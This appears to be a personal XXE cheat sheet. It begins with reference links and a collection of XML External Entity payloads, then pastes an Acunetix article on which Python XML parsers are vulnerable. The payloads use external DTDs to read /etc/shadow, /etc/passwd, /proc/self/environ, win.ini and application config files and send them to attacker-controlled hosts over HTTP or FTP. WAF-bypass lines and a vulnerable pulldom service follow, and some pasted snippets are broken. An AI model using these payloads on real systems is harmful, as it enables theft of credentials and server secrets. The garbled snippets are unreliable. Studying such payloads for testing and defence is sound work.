What is XML External Entity (XXE)?
##
#
https://www.acunetix.com/blog/web-security-zone/how-to-mitigate-xxe-vulnerabilities-in-python/
#
https://rohitcoder.medium.com/comprehensive-guide-detecting-fixing-and-defending-against-xxe-attacks-in-python-and-java-e78691b4b918
#
https://bin3xish477.medium.com/hackthebox-bountyhunter-529371920233
#
https://darkwing.moe/2020/05/21/Patents-HackTheBox/
#
https://0xdf.gitlab.io/2020/05/16/htb-patents.html
#
##

```
--------------------------------------------------------------
Vanilla, used to verify outbound xxe or blind xxe
--------------------------------------------------------------

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
]>
<r>&sp;</r>

---------------------------------------------------------------
OoB extraction
---------------------------------------------------------------

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

## External dtd: ##

<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">

----------------------------------------------------------------
OoB variation of above (seems to work better against .NET)
----------------------------------------------------------------
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
%exfil;
]>

## External dtd: ##

<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">

---------------------------------------------------------------
OoB extraction
---------------------------------------------------------------

<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/shadow">
<!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd">
%sp;
%param3;
%exfil;
]>

## External dtd: ##
<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>">

-----------------------------------------------------------------------
OoB extra ERROR -- Java
-----------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/passwd">
<!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd">
%sp;
%param3;
%exfil;
]>
<r></r>
## External dtd: ##

<!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%payload;">'> %param1; %external;


-----------------------------------------------------------------------
OoB extra nice
-----------------------------------------------------------------------

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml ">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://evil/evil.xml">
%dtd;
]>
<root>&all;</root>
 
## External dtd: ##
 
<!ENTITY all "%start;%stuff;%end;">

------------------------------------------------------------------
File-not-found exception based extraction
------------------------------------------------------------------

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >
  %one;
  %two;
  %four;
]>

## External dtd: ##

<!ENTITY % three SYSTEM "file:///etc/passwd">
<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">

-------------------------^ you might need to encode this % (depends on your target) as: &#x25;

--------------
FTP
--------------
<?xml version="1.0" ?>
<!DOCTYPE a [ 
<!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd">
%asd;
%c;
]>
<a>&rrr;</a>


## External dtd ##
<!ENTITY % d SYSTEM "file:///proc/self/environ">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">

---------------------------
Inside SOAP body
---------------------------
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>


---------------------------
Untested - WAF Bypass
---------------------------
<!DOCTYPE :. SYTEM "http://"
<!DOCTYPE :_-_: SYTEM "http://"
<!DOCTYPE {0xdfbf} SYSTEM "http://"
```

XML External Entity Injection is often referred to as a variant of Server-side Request Forgery (SSRF). XXE leverages language parsers that parse the widely used data format, XML used in a number of common scenarios such as SOAP & REST web services and file formats such as PDF, DOCX, HTML.

The main issue lies in XML parsers and how by default, they handle outbound network calls as well as other XML-specific features which we will get into. For a broader and more in-depth explanation of XXE, I would highly recommend going over our 2-part series first.

Python XML Libraries
In the Python ecosystem (2.X & 3.X) most if not all XML parsing is handled by the standard libraries:

minidom
etree
sax
pulldom
And in some cases, even beautifulsoup, since as we said HTML is a subset of XML, we can parse XML using it. Good news is that minidom and etree are not vulnerable to XXE by default. As a result we’ll focus on pulldom as it’s tightly knit to sax.

Examples
The following example leverages the pulldom module as well as bottle to create a very minimal web service. It has a single endpoint, POST /pulldom that receives the request body as XML, parses it and returns it back.

import bottle

from xml.dom.pulldom import START_ELEMENT, parse

@bottle.post('/pulldom')
def pulldom():
    doc = parse(bottle.request.body)
    for event, node in doc:
        doc.expandNode(node)
    return(str(doc))

if __name__ == '__main__':
    bottle.run(host='0.0.0.0', port=5050)
The scanner can detect this by leveraging our AcuMonitor service, by transmitting and receiving the following request and response during the scan:

Request
POST http://localhost:5050/lxmlnet HTTP/1.1
Content-type: text/xml
Host: localhost:5050


<!ENTITY dteyybzent SYSTEM "http://hitWP5ElLuA1m.bxss.me/">
]>
&dteyybzent;
In bold you can see the !ENTITY expansion pointing to a remote URL which in this case, routes to AcuMonitor (under bxss.me).

Response
HTTP/1.0 500 Internal Server Error
Server: WSGIServer/0.1 Python/2.7.14

...
<body>
<h1>Error: 500 Internal Server Error</h1>
<p>Sorry, the requested URL <tt>&#039;http://localhost:5050/lxmlnet&#039;</tt>
caused an error:</p>
<pre>Internal Server Error</pre>
</body>
...
HTTP Response truncated for clarity

The server tried processing the payload internally, sent the request and raised a SAXParseException:

SAXParseException: http://hituxSWuqFxmy.bxss.me/:2:0: error in processing external entity reference
Conclusion
With security, the first question when receiving an input is along the lines of, “Where is this data source coming from?”. Given that the two most popular libraries, minidom and etree are safe from XXE attacks (though vulnerable to others) you are generally good to go from the standard library.

The alternative libraries, pulldom and sax are by design, required to pull XML from remote locations, which means that you should avoid using them handling untrusted user XML in any form. Should you still opt to use the aforementioned libraries, you should wrap them with your own safe implementation that sanitizes input prior to processing it.

Vulnerabilities such as XXE and many more can be detected automatically with Acunetix, by leveraging our AcuMonitor service to detect Out-of-Band vulnerabilities.



